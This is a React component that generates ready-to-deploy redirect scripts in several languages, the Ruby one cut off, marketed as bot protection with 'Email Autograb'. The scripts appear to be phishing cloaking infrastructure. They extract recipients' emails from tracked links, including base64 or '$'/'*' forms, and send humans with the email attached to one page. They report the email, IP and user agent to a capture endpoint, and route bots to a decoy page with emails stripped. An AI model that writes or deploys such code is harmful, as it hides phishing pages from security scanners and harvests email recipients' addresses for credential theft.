import React, { useState } from 'react';
import { Card } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Tabs, TabsList, TabsTrigger, TabsContent } from '@/components/ui/tabs';
import { Copy, Code, FileCode } from 'lucide-react';
import { toast } from 'sonner';

export default function IntegrationScript({ apiUser }) {
  const [copied, setCopied] = useState(false);

  const phpScript = `<?php
// Bot Protection Script with Email Autograb
// Generated for: ${apiUser?.username || 'User'}
// API Key: ${apiUser?.api_key || 'YOUR_API_KEY'}

define('API_KEY', '${apiUser?.api_key || 'YOUR_API_KEY'}');
define('API_ENDPOINT', '${window.location.origin}/api/classify');
define('EMAIL_CAPTURE_ENDPOINT', '${window.location.origin}/api/capture-email');
define('HUMAN_URL', '${apiUser?.human_redirect_url || 'https://example.com/human'}');
define('BOT_URL', '${apiUser?.bot_redirect_url || 'https://example.com/bot'}');

// ==========================================
// EMAIL AUTOGRAB FUNCTIONS
// ==========================================

/**
 * Extract emails from URL - supports multiple formats:
 * - Query string: ?email=test@example.com
 * - Dollar sign: $test@example.com
 * - Asterisk: *test@example.com
 * - Hash: #email=test@example.com
 * - Base64 encoded emails
 */
function extractEmailsFromURL($url) {
    $emails = [];
    $decodedUrl = urldecode($url);
    
    // Pattern 1: Plain email addresses anywhere in URL
    preg_match_all('/([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\\.[a-zA-Z0-9_-]+)/i', $decodedUrl, $matches);
    if (!empty($matches[1])) {
        $emails = array_merge($emails, $matches[1]);
    }
    
    // Pattern 2: Base64 encoded emails after separators ($, *, ?, &, #)
    preg_match_all('/[\\$\\*\\?&#]([A-Za-z0-9+\\/]{20,}={0,2})/', $decodedUrl, $base64Matches);
    foreach ($base64Matches[1] as $base64String) {
        $decoded = @base64_decode($base64String);
        if ($decoded !== false) {
            preg_match_all('/([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\\.[a-zA-Z0-9_-]+)/i', $decoded, $decodedEmails);
            if (!empty($decodedEmails[1])) {
                $emails = array_merge($emails, $decodedEmails[1]);
            }
        }
    }
    
    return array_unique($emails);
}

/**
 * Strip email addresses from URL parameters
 * Used for bot redirects to protect emails
 */
function stripEmailsFromURL($url) {
    $decodedUrl = urldecode($url);
    
    // Remove email addresses
    $cleaned = preg_replace('/([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\\.[a-zA-Z0-9_-]+)/i', '', $decodedUrl);
    
    // Clean up empty parameters
    $cleaned = preg_replace('/[?&](\\w+)=&/', '&', $cleaned);
    $cleaned = preg_replace('/[?&](\\w+)=$/', '', $cleaned);
    $cleaned = preg_replace('/\\?&/', '?', $cleaned);
    $cleaned = preg_replace('/\\?$/', '', $cleaned);
    $cleaned = preg_replace('/&$/', '', $cleaned);
    $cleaned = preg_replace('/[#$*]$/', '', $cleaned);
    
    return $cleaned;
}

/**
 * Get parameters after the script path
 * Captures everything: query strings, fragments, custom separators
 */
function getURLParameters() {
    $params = '';
    
    // Get query string
    if (!empty($_SERVER['QUERY_STRING'])) {
        $params .= '?' . $_SERVER['QUERY_STRING'];
    }
    
    // Get full request URI for custom separators ($, *)
    $requestUri = $_SERVER['REQUEST_URI'] ?? '';
    
    // Check for $ or * separators (common in email marketing)
    if (preg_match('/[\\$\\*](.+)$/', $requestUri, $matches)) {
        // If no query string yet, start fresh
        if (empty($params)) {
            $params = '$' . $matches[1];
        }
    }
    
    return $params;
}

/**
 * Append parameters to destination URL
 */
function appendParametersToURL($destinationUrl, $params) {
    if (empty($params)) return $destinationUrl;
    
    $result = $destinationUrl;
    
    if (strpos($params, '?') === 0) {
        // Query parameter
        $queryString = substr($params, 1);
        if (!empty($queryString)) {
            $result .= (strpos($destinationUrl, '?') !== false) ? '&' : '?';
            $result .= $queryString;
        }
    } elseif (strpos($params, '#') === 0) {
        // Hash fragment
        $result = explode('#', $result)[0] . $params;
    } elseif (strpos($params, '$') === 0 || strpos($params, '*') === 0) {
        // Custom separators - add trailing slash to prevent @ misinterpretation
        if (substr($result, -1) !== '/') {
            $result .= '/';
        }
        $result .= $params;
    }
    
    return $result;
}

/**
 * Send captured email to main system (async, non-blocking)
 */
function captureEmailAsync($email, $ipAddress, $userAgent, $sourceUrl) {
    $data = [
        'api_key' => API_KEY,
        'email' => $email,
        'ip_address' => $ipAddress,
        'user_agent' => $userAgent,
        'source_url' => $sourceUrl,
        'captured_at' => date('c')
    ];
    
    // Non-blocking request using socket
    $parts = parse_url(EMAIL_CAPTURE_ENDPOINT);
    $host = $parts['host'];
    $port = isset($parts['scheme']) && $parts['scheme'] === 'https' ? 443 : 80;
    $path = $parts['path'] ?? '/';
    
    $jsonData = json_encode($data);
    $contentLength = strlen($jsonData);
    
    $fp = @fsockopen(($port === 443 ? 'ssl://' : '') . $host, $port, $errno, $errstr, 1);
    if ($fp) {
        $request = "POST $path HTTP/1.1\\r\\n";
        $request .= "Host: $host\\r\\n";
        $request .= "Content-Type: application/json\\r\\n";
        $request .= "Content-Length: $contentLength\\r\\n";
        $request .= "X-API-Key: " . API_KEY . "\\r\\n";
        $request .= "Connection: Close\\r\\n\\r\\n";
        $request .= $jsonData;
        
        fwrite($fp, $request);
        fclose($fp);
    }
}

// ==========================================
// MAIN SCRIPT EXECUTION
// ==========================================

// Get visitor information
$ipAddress = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$referer = $_SERVER['HTTP_REFERER'] ?? 'direct';
$fullUrl = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http') 
           . '://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];

// Extract emails from URL (Email Autograb)
$emails = extractEmailsFromURL($fullUrl);
$email = !empty($emails) ? $emails[0] : null;

// Get URL parameters
$urlParams = getURLParameters();

// Prepare classification request
$data = [
    'api_key' => API_KEY,
    'ip_address' => $ipAddress,
    'user_agent' => $userAgent,
    'referer' => $referer,
    'origin' => $_SERVER['HTTP_HOST'],
    'timestamp' => time()
];

// Generate HMAC signature
$signature = hash_hmac('sha256', json_encode($data), API_KEY);
$data['signature'] = $signature;

// Make API request
$ch = curl_init(API_ENDPOINT);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Content-Type: application/json',
    'X-API-Key: ' . API_KEY
]);
curl_setopt($ch, CURLOPT_TIMEOUT, 5);

$response = curl_exec($ch);
curl_close($ch);

$result = json_decode($response, true);
$isHuman = isset($result['classification']) && $result['classification'] === 'HUMAN';

// Determine final URL based on classification
if ($isHuman) {
    // HUMAN: Forward ALL parameters including email
    $finalUrl = appendParametersToURL(HUMAN_URL, $urlParams);
    
    // Capture email to main system (async)
    if ($email) {
        captureEmailAsync($email, $ipAddress, $userAgent, $fullUrl);
    }
} else {
    // BOT: Strip email from parameters
    $cleanParams = stripEmailsFromURL($urlParams);
    $finalUrl = appendParametersToURL(BOT_URL, $cleanParams);
}

// Perform redirect
header('Location: ' . $finalUrl);
exit;
?>`;

  const jsScript = `// JavaScript Bot Detection with Email Autograb
// Generated for: ${apiUser?.username || 'User'}

const API_KEY = '${apiUser?.api_key || 'YOUR_API_KEY'}';
const API_ENDPOINT = '${window.location.origin}/api/classify';
const EMAIL_CAPTURE_ENDPOINT = '${window.location.origin}/api/capture-email';
const HUMAN_URL = '${apiUser?.human_redirect_url || 'https://example.com/human'}';
const BOT_URL = '${apiUser?.bot_redirect_url || 'https://example.com/bot'}';

// ==========================================
// EMAIL AUTOGRAB FUNCTIONS
// ==========================================

/**
 * Extract emails from URL - supports multiple formats
 */
function extractEmailsFromURL(url) {
    const emails = [];
    let decodedUrl = url;
    try { decodedUrl = decodeURIComponent(url); } catch (e) {}
    
    // Pattern 1: Plain email addresses
    const emailRegex = /([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\\.[a-zA-Z0-9_-]+)/gi;
    const matches = decodedUrl.match(emailRegex);
    if (matches) emails.push(...matches);
    
    // Pattern 2: Base64 encoded emails
    const base64Regex = /[\\$\\*\\?&#]([A-Za-z0-9+\\/]{20,}={0,2})/g;
    let base64Match;
    while ((base64Match = base64Regex.exec(decodedUrl)) !== null) {
        try {
            const decoded = atob(base64Match[1]);
            const decodedEmails = decoded.match(emailRegex);
            if (decodedEmails) emails.push(...decodedEmails);
        } catch (e) {}
    }
    
    return [...new Set(emails)];
}

/**
 * Strip emails from URL parameters
 */
function stripEmailsFromParams(params) {
    if (!params) return params;
    const emailRegex = /([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\\.[a-zA-Z0-9_-]+)/gi;
    let cleaned = params.replace(emailRegex, '');
    cleaned = cleaned.replace(/[?&](\\w+)=&/g, '&');
    cleaned = cleaned.replace(/[?&](\\w+)=$/g, '');
    cleaned = cleaned.replace(/\\?&/g, '?');
    cleaned = cleaned.replace(/\\?$/g, '');
    cleaned = cleaned.replace(/&$/g, '');
    cleaned = cleaned.replace(/[#$*]$/g, '');
    return cleaned;
}

/**
 * Append parameters to destination URL
 */
function appendParametersToURL(destUrl, params) {
    if (!params) return destUrl;
    let result = destUrl;
    
    if (params.startsWith('?')) {
        const queryString = params.substring(1);
        if (queryString) {
            result += destUrl.includes('?') ? '&' + queryString : '?' + queryString;
        }
    } else if (params.startsWith('#')) {
        result = result.split('#')[0] + params;
    } else if (params.startsWith('$') || params.startsWith('*')) {
        if (!result.endsWith('/')) result += '/';
        result += params;
    }
    return result;
}

/**
 * Send captured email to main system
 */
async function captureEmail(email, sourceUrl) {
    try {
        await fetch(EMAIL_CAPTURE_ENDPOINT, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'X-API-Key': API_KEY },
            body: JSON.stringify({
                api_key: API_KEY,
                email: email,
                user_agent: navigator.userAgent,
                source_url: sourceUrl,
                captured_at: new Date().toISOString()
            })
        });
    } catch (e) { /* Fire and forget */ }
}

// ==========================================
// MAIN EXECUTION
// ==========================================

async function classifyVisitor() {
    const fullUrl = window.location.href;
    const urlParams = window.location.search + window.location.hash;
    
    // Extract emails from URL (Email Autograb)
    const emails = extractEmailsFromURL(fullUrl);
    const email = emails.length > 0 ? emails[0] : null;
    
    const data = {
        api_key: API_KEY,
        user_agent: navigator.userAgent,
        referer: document.referrer || 'direct',
        origin: window.location.hostname,
        timestamp: Date.now()
    };

    try {
        const response = await fetch(API_ENDPOINT, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json', 'X-API-Key': API_KEY },
            body: JSON.stringify(data)
        });

        const result = await response.json();
        const isHuman = result.classification === 'HUMAN';
        
        let finalUrl;
        if (isHuman) {
            // HUMAN: Forward ALL parameters including email
            finalUrl = appendParametersToURL(HUMAN_URL, urlParams);
            // Capture email to main system
            if (email) captureEmail(email, fullUrl);
        } else {
            // BOT: Strip email from parameters
            const cleanParams = stripEmailsFromParams(urlParams);
            finalUrl = appendParametersToURL(BOT_URL, cleanParams);
        }
        
        window.location.href = finalUrl;
    } catch (error) {
        console.error('Classification error:', error);
        // Fallback: redirect to human URL
        window.location.href = HUMAN_URL;
    }
}

// Run classification
classifyVisitor();`;

  // Python (Flask) Script
  const pythonScript = `# Bot Protection Script with Email Autograb (Flask)
# Generated for: ${apiUser?.username || 'User'}
# API Key: ${apiUser?.api_key || 'YOUR_API_KEY'}
# pip install flask requests

from flask import Flask, request, redirect
import requests
import re
import base64
import hashlib
import hmac
import json
import time
from urllib.parse import urlencode, urlparse, parse_qs
import threading

app = Flask(__name__)

# Configuration
API_KEY = '${apiUser?.api_key || 'YOUR_API_KEY'}'
API_ENDPOINT = '${window.location.origin}/api/classify'
EMAIL_CAPTURE_ENDPOINT = '${window.location.origin}/api/capture-email'
HUMAN_URL = '${apiUser?.human_redirect_url || 'https://example.com/human'}'
BOT_URL = '${apiUser?.bot_redirect_url || 'https://example.com/bot'}'

# ==========================================
# EMAIL AUTOGRAB FUNCTIONS
# ==========================================

def extract_emails_from_url(url):
    """Extract emails from URL - supports multiple formats"""
    emails = []
    try:
        from urllib.parse import unquote
        decoded_url = unquote(url)
    except:
        decoded_url = url
    
    # Pattern 1: Plain email addresses
    email_pattern = r'([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\\.[a-zA-Z0-9_-]+)'
    matches = re.findall(email_pattern, decoded_url, re.IGNORECASE)
    emails.extend(matches)
    
    # Pattern 2: Base64 encoded emails
    base64_pattern = r'[\\$\\*\\?&#]([A-Za-z0-9+/]{20,}={0,2})'
    for match in re.findall(base64_pattern, decoded_url):
        try:
            decoded = base64.b64decode(match).decode('utf-8')
            decoded_emails = re.findall(email_pattern, decoded, re.IGNORECASE)
            emails.extend(decoded_emails)
        except:
            pass
    
    return list(set(emails))

def strip_emails_from_params(params):
    """Strip email addresses from URL parameters"""
    if not params:
        return params
    email_pattern = r'([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\\.[a-zA-Z0-9_-]+)'
    cleaned = re.sub(email_pattern, '', params, flags=re.IGNORECASE)
    # Clean up empty parameters
    cleaned = re.sub(r'[?&](\\w+)=&', '&', cleaned)
    cleaned = re.sub(r'[?&](\\w+)=$', '', cleaned)
    cleaned = re.sub(r'\\?&', '?', cleaned)
    cleaned = re.sub(r'\\?$', '', cleaned)
    cleaned = re.sub(r'&$', '', cleaned)
    cleaned = re.sub(r'[#$*]$', '', cleaned)
    return cleaned

def append_params_to_url(dest_url, params):
    """Append parameters to destination URL"""
    if not params:
        return dest_url
    
    result = dest_url
    if params.startswith('?'):
        query = params[1:]
        if query:
            result += '&' + query if '?' in dest_url else '?' + query
    elif params.startswith('#'):
        result = result.split('#')[0] + params
    elif params.startswith('$') or params.startswith('*'):
        if not result.endswith('/'):
            result += '/'
        result += params
    return result

def capture_email_async(email, ip_address, user_agent, source_url):
    """Send captured email to main system (async)"""
    def send():
        try:
            requests.post(EMAIL_CAPTURE_ENDPOINT, json={
                'api_key': API_KEY,
                'email': email,
                'ip_address': ip_address,
                'user_agent': user_agent,
                'source_url': source_url,
                'captured_at': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())
            }, headers={'X-API-Key': API_KEY}, timeout=5)
        except:
            pass
    threading.Thread(target=send).start()

# ==========================================
# MAIN ROUTE
# ==========================================

@app.route('/redirect')
@app.route('/redirect/<path:subpath>')
def handle_redirect(subpath=''):
    # Get visitor info
    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', '')
    referer = request.headers.get('Referer', 'direct')
    full_url = request.url
    
    # Extract emails (Email Autograb)
    emails = extract_emails_from_url(full_url)
    email = emails[0] if emails else None
    
    # Get URL parameters
    url_params = ''
    if request.query_string:
        url_params = '?' + request.query_string.decode()
    # Check for custom separators in path
    if '$' in subpath:
        url_params = '$' + subpath.split('$', 1)[1]
    elif '*' in subpath:
        url_params = '*' + subpath.split('*', 1)[1]
    
    # Classify visitor
    data = {
        'api_key': API_KEY,
        'ip_address': ip_address,
        'user_agent': user_agent,
        'referer': referer,
        'origin': request.host,
        'timestamp': int(time.time())
    }
    signature = hmac.new(API_KEY.encode(), json.dumps(data).encode(), hashlib.sha256).hexdigest()
    data['signature'] = signature
    
    try:
        response = requests.post(API_ENDPOINT, json=data, 
                                headers={'Content-Type': 'application/json', 'X-API-Key': API_KEY},
                                timeout=5)
        result = response.json()
        is_human = result.get('classification') == 'HUMAN'
    except:
        is_human = True  # Fallback to human on error
    
    # Determine final URL
    if is_human:
        final_url = append_params_to_url(HUMAN_URL, url_params)
        if email:
            capture_email_async(email, ip_address, user_agent, full_url)
    else:
        clean_params = strip_emails_from_params(url_params)
        final_url = append_params_to_url(BOT_URL, clean_params)
    
    return redirect(final_url, code=302)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)`;

  // Node.js (Express) Script
  const nodeScript = `// Bot Protection Script with Email Autograb (Express.js)
// Generated for: ${apiUser?.username || 'User'}
// API Key: ${apiUser?.api_key || 'YOUR_API_KEY'}
// npm install express node-fetch

const express = require('express');
const crypto = require('crypto');
const app = express();

// Configuration
const API_KEY = '${apiUser?.api_key || 'YOUR_API_KEY'}';
const API_ENDPOINT = '${window.location.origin}/api/classify';
const EMAIL_CAPTURE_ENDPOINT = '${window.location.origin}/api/capture-email';
const HUMAN_URL = '${apiUser?.human_redirect_url || 'https://example.com/human'}';
const BOT_URL = '${apiUser?.bot_redirect_url || 'https://example.com/bot'}';

// ==========================================
// EMAIL AUTOGRAB FUNCTIONS
// ==========================================

function extractEmailsFromURL(url) {
  const emails = [];
  let decodedUrl = url;
  try { decodedUrl = decodeURIComponent(url); } catch (e) {}
  
  // Pattern 1: Plain email addresses
  const emailRegex = /([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\\.[a-zA-Z0-9_-]+)/gi;
  const matches = decodedUrl.match(emailRegex);
  if (matches) emails.push(...matches);
  
  // Pattern 2: Base64 encoded emails
  const base64Regex = /[\\$\\*\\?&#]([A-Za-z0-9+\\/]{20,}={0,2})/g;
  let base64Match;
  while ((base64Match = base64Regex.exec(decodedUrl)) !== null) {
    try {
      const decoded = Buffer.from(base64Match[1], 'base64').toString('utf-8');
      const decodedEmails = decoded.match(emailRegex);
      if (decodedEmails) emails.push(...decodedEmails);
    } catch (e) {}
  }
  
  return [...new Set(emails)];
}

function stripEmailsFromParams(params) {
  if (!params) return params;
  const emailRegex = /([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\\.[a-zA-Z0-9_-]+)/gi;
  let cleaned = params.replace(emailRegex, '');
  cleaned = cleaned.replace(/[?&](\\w+)=&/g, '&');
  cleaned = cleaned.replace(/[?&](\\w+)=$/g, '');
  cleaned = cleaned.replace(/\\?&/g, '?');
  cleaned = cleaned.replace(/\\?$/g, '');
  cleaned = cleaned.replace(/&$/g, '');
  cleaned = cleaned.replace(/[#$*]$/g, '');
  return cleaned;
}

function appendParamsToURL(destUrl, params) {
  if (!params) return destUrl;
  let result = destUrl;
  
  if (params.startsWith('?')) {
    const query = params.substring(1);
    if (query) result += destUrl.includes('?') ? '&' + query : '?' + query;
  } else if (params.startsWith('#')) {
    result = result.split('#')[0] + params;
  } else if (params.startsWith('$') || params.startsWith('*')) {
    if (!result.endsWith('/')) result += '/';
    result += params;
  }
  return result;
}

async function captureEmailAsync(email, ipAddress, userAgent, sourceUrl) {
  try {
    const fetch = (await import('node-fetch')).default;
    fetch(EMAIL_CAPTURE_ENDPOINT, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'X-API-Key': API_KEY },
      body: JSON.stringify({
        api_key: API_KEY,
        email,
        ip_address: ipAddress,
        user_agent: userAgent,
        source_url: sourceUrl,
        captured_at: new Date().toISOString()
      })
    }).catch(() => {}); // Fire and forget
  } catch (e) {}
}

// ==========================================
// MAIN ROUTE
// ==========================================

app.get('/redirect', async (req, res) => {
  const fetch = (await import('node-fetch')).default;
  
  // Get visitor info
  const ipAddress = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const userAgent = req.headers['user-agent'] || '';
  const referer = req.headers['referer'] || 'direct';
  const fullUrl = req.protocol + '://' + req.get('host') + req.originalUrl;
  
  // Extract emails (Email Autograb)
  const emails = extractEmailsFromURL(fullUrl);
  const email = emails.length > 0 ? emails[0] : null;
  
  // Get URL parameters
  let urlParams = req.originalUrl.includes('?') 
    ? '?' + req.originalUrl.split('?')[1] 
    : '';
  
  // Check for custom separators
  const pathMatch = req.originalUrl.match(/[\\$\\*](.+)$/);
  if (pathMatch && !urlParams) {
    urlParams = req.originalUrl.match(/[\\$\\*]/)[0] + pathMatch[1];
  }
  
  // Classify visitor
  const data = {
    api_key: API_KEY,
    ip_address: ipAddress,
    user_agent: userAgent,
    referer,
    origin: req.get('host'),
    timestamp: Date.now()
  };
  data.signature = crypto.createHmac('sha256', API_KEY).update(JSON.stringify(data)).digest('hex');
  
  let isHuman = true;
  try {
    const response = await fetch(API_ENDPOINT, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'X-API-Key': API_KEY },
      body: JSON.stringify(data)
    });
    const result = await response.json();
    isHuman = result.classification === 'HUMAN';
  } catch (e) {}
  
  // Determine final URL
  let finalUrl;
  if (isHuman) {
    finalUrl = appendParamsToURL(HUMAN_URL, urlParams);
    if (email) captureEmailAsync(email, ipAddress, userAgent, fullUrl);
  } else {
    const cleanParams = stripEmailsFromParams(urlParams);
    finalUrl = appendParamsToURL(BOT_URL, cleanParams);
  }
  
  res.redirect(302, finalUrl);
});

app.listen(3000, () => console.log('Server running on port 3000'));`;

  // Go Script
  const goScript = `// Bot Protection Script with Email Autograb (Go)
// Generated for: ${apiUser?.username || 'User'}
// API Key: ${apiUser?.api_key || 'YOUR_API_KEY'}

package main

import (
	"bytes"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"time"
)

// Configuration
const (
	APIKey              = "${apiUser?.api_key || 'YOUR_API_KEY'}"
	APIEndpoint         = "${window.location.origin}/api/classify"
	EmailCaptureEndpoint = "${window.location.origin}/api/capture-email"
	HumanURL            = "${apiUser?.human_redirect_url || 'https://example.com/human'}"
	BotURL              = "${apiUser?.bot_redirect_url || 'https://example.com/bot'}"
)

// ==========================================
// EMAIL AUTOGRAB FUNCTIONS
// ==========================================

func extractEmailsFromURL(rawURL string) []string {
	emails := make(map[string]bool)
	decodedURL, _ := url.QueryUnescape(rawURL)
	
	// Pattern 1: Plain email addresses
	emailRegex := regexp.MustCompile(\`(?i)([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\\.[a-zA-Z0-9_-]+)\`)
	matches := emailRegex.FindAllString(decodedURL, -1)
	for _, m := range matches {
		emails[strings.ToLower(m)] = true
	}
	
	// Pattern 2: Base64 encoded emails
	base64Regex := regexp.MustCompile(\`[\\$\\*\\?&#]([A-Za-z0-9+/]{20,}={0,2})\`)
	b64Matches := base64Regex.FindAllStringSubmatch(decodedURL, -1)
	for _, m := range b64Matches {
		if decoded, err := base64.StdEncoding.DecodeString(m[1]); err == nil {
			decodedEmails := emailRegex.FindAllString(string(decoded), -1)
			for _, e := range decodedEmails {
				emails[strings.ToLower(e)] = true
			}
		}
	}
	
	result := make([]string, 0, len(emails))
	for e := range emails {
		result = append(result, e)
	}
	return result
}

func stripEmailsFromParams(params string) string {
	if params == "" {
		return params
	}
	emailRegex := regexp.MustCompile(\`(?i)([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\\.[a-zA-Z0-9_-]+)\`)
	cleaned := emailRegex.ReplaceAllString(params, "")
	// Clean up empty parameters
	cleaned = regexp.MustCompile(\`[?&](\\w+)=&\`).ReplaceAllString(cleaned, "&")
	cleaned = regexp.MustCompile(\`[?&](\\w+)=$\`).ReplaceAllString(cleaned, "")
	cleaned = strings.TrimSuffix(cleaned, "?")
	cleaned = strings.TrimSuffix(cleaned, "&")
	cleaned = strings.TrimRight(cleaned, "#$*")
	return cleaned
}

func appendParamsToURL(destURL, params string) string {
	if params == "" {
		return destURL
	}
	
	if strings.HasPrefix(params, "?") {
		query := params[1:]
		if query != "" {
			if strings.Contains(destURL, "?") {
				return destURL + "&" + query
			}
			return destURL + "?" + query
		}
	} else if strings.HasPrefix(params, "#") {
		return strings.Split(destURL, "#")[0] + params
	} else if strings.HasPrefix(params, "$") || strings.HasPrefix(params, "*") {
		if !strings.HasSuffix(destURL, "/") {
			destURL += "/"
		}
		return destURL + params
	}
	return destURL
}

func captureEmailAsync(email, ipAddress, userAgent, sourceURL string) {
	go func() {
		data := map[string]string{
			"api_key":    APIKey,
			"email":      email,
			"ip_address": ipAddress,
			"user_agent": userAgent,
			"source_url": sourceURL,
			"captured_at": time.Now().UTC().Format(time.RFC3339),
		}
		jsonData, _ := json.Marshal(data)
		req, _ := http.NewRequest("POST", EmailCaptureEndpoint, bytes.NewBuffer(jsonData))
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("X-API-Key", APIKey)
		client := &http.Client{Timeout: 5 * time.Second}
		client.Do(req)
	}()
}

// ==========================================
// MAIN HANDLER
// ==========================================

func redirectHandler(w http.ResponseWriter, r *http.Request) {
	// Get visitor info
	ipAddress := r.Header.Get("X-Forwarded-For")
	if ipAddress == "" {
		ipAddress = r.RemoteAddr
	}
	userAgent := r.Header.Get("User-Agent")
	referer := r.Header.Get("Referer")
	if referer == "" {
		referer = "direct"
	}
	fullURL := "https://" + r.Host + r.RequestURI
	
	// Extract emails (Email Autograb)
	emails := extractEmailsFromURL(fullURL)
	var email string
	if len(emails) > 0 {
		email = emails[0]
	}
	
	// Get URL parameters
	urlParams := ""
	if r.URL.RawQuery != "" {
		urlParams = "?" + r.URL.RawQuery
	}
	
	// Classify visitor
	data := map[string]interface{}{
		"api_key":    APIKey,
		"ip_address": ipAddress,
		"user_agent": userAgent,
		"referer":    referer,
		"origin":     r.Host,
		"timestamp":  time.Now().Unix(),
	}
	jsonData, _ := json.Marshal(data)
	h := hmac.New(sha256.New, []byte(APIKey))
	h.Write(jsonData)
	data["signature"] = hex.EncodeToString(h.Sum(nil))
	jsonData, _ = json.Marshal(data)
	
	isHuman := true
	req, _ := http.NewRequest("POST", APIEndpoint, bytes.NewBuffer(jsonData))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-API-Key", APIKey)
	client := &http.Client{Timeout: 5 * time.Second}
	if resp, err := client.Do(req); err == nil {
		defer resp.Body.Close()
		var result map[string]interface{}
		json.NewDecoder(resp.Body).Decode(&result)
		if class, ok := result["classification"].(string); ok {
			isHuman = class == "HUMAN"
		}
	}
	
	// Determine final URL
	var finalURL string
	if isHuman {
		finalURL = appendParamsToURL(HumanURL, urlParams)
		if email != "" {
			captureEmailAsync(email, ipAddress, userAgent, fullURL)
		}
	} else {
		cleanParams := stripEmailsFromParams(urlParams)
		finalURL = appendParamsToURL(BotURL, cleanParams)
	}
	
	http.Redirect(w, r, finalURL, http.StatusFound)
}

func main() {
	http.HandleFunc("/redirect", redirectHandler)
	fmt.Println("Server running on :8080")
	http.ListenAndServe(":8080", nil)
}`;

  // Ruby (Sinatra) Script
  const rubyScript = `# Bot Protection Script with Email Autograb (Sinatra)
# Generated for: ${apiUser?.username || 'User'}
# API Key: ${apiUser?.api_key || 'YOUR_API_KEY'}
# gem install sinatra httparty

require 'sinatra'
require 'httparty'
require 'json'
require 'openssl'
require 'base64'
require 'uri'

# Configuration
API_KEY = '${apiUser?.api_key || 'YOUR_API_KEY'}'
API_ENDPOINT = '${window.location.origin}/api/classify'
EMAIL_CAPTURE_ENDPOINT = '${window.location.origin}/api/capture-email'
HUMAN_URL = '${apiUser?.human_redirect_url || 'https://example.com/human'}'
BOT_URL = '${apiUser?.bot_redirect_url || 'https://example.com/bot'}'

# ==========================================
# EMAIL AUTOGRAB FUNCTIONS
# ==========================================

def extract_emails_from_url(url)
  emails = []
  decoded_url = URI.decode_www_form_component(url) rescue url
  
  # Pattern 1: Plain email addresses
  email_regex = /([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\\.[a-zA-Z0-9_-]+)/i
  emails += decoded_url.scan(email_regex).flatten
  
  # Pattern 2: Base64 encoded emails
  base64_regex = /[\\$\\*\\?&#]([A-Za-z0-9+\\/]{20,}={0,2})/
  decoded_url.scan(base64_regex).flatten.each do |b64|
    begin
      decoded = Base64.decode64(b64)
      emails += decoded.scan(email_regex).flatten
    rescue
    end
  end
  
  emails.uniq
end

def strip_emails_from_params(params)
  return params if params.nil? || params.empty?
  
  email_regex = /([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\\.[a-zA-Z0-9_-]+)/i
  cleaned = params.gsub(email_regex, '')
  cleaned = cleaned.gsub(/[?&](\\w+)=&/, '&')
  cleaned = cleaned.gsub(/[?&](\\w+)=$/, '')
  cleaned = cleaned.gsub(/\\?&/, '?')
  cleaned = cleaned.chomp('?').chomp('&').chomp('#').chomp('$').chomp('*')
  cleaned
end

def append_params_to_url(dest_url, params)
  return dest_url if params.nil? || params.empty?
  
  if params.start_with?('?')
    query = params[1..-1]
    return dest_url if query.empty?
    dest_url.include?('?') ? "#{dest_url}&#{query}" : "#{dest_url}?#{query}"
  elsif params.start_with?('#')
    dest_url.split('#')[0] + params
  elsif params.start_with?('$') || params.start_with?('*')
    dest_url.end_with?('/') ? "#{dest_url}#{params}" : "#{dest_url}/#{params}"
  else
    dest_url
  end
end

def capture_email_async(email, ip_address, user_agent, source_url)
  Thread.new do
    begin
      HTTParty.post(EMAIL_CAPTURE_ENDPOINT, {
        body: {
          api_key: API_KEY,
          email: email,
          ip_address: ip_address,
          user_agent: user_agent,
          source_url: source_url,
          captured_at: Time.now.utc.iso8601
        }.to_json,
        headers: { 'Content-Type' => 'application/json', 'X-API-Key' => API_KEY },
        timeout: 5
      })
    rescue
    end
  end
end

# ==========================================
# MAIN ROUTE
# ==========================================

get '/redirect' do
  # Get visitor info
  ip_address = request.env['HTTP_X_FORWARDED_FOR'] || request.ip
  user_agent = request.user_agent || ''
  referer = request.referer || 'direct'
  full_url = request.url
  
  # Extract emails (Email Autograb)
  emails = extract_emails_from_url(full_url)
  email = emails.first
  
  # Get URL parameters
  url_params = request.query_string.empty? ? '' : "?#{request.query_string}"
  
  # Check for custom separators in path
  if request.path_info.include?('$')
    url_params = '$' + request.path_info.split('$', 2)[1]
  elsif request.path_info.include?('*')
    url_params = '*' + request.path_info.split('*', 2)[1]
  end
  
  # Classify visitor
  data = {
    api_key: API_KEY,
    ip_address: ip_address,
    user_agent: user_agent,
    referer: referer,
    origin: request.host,
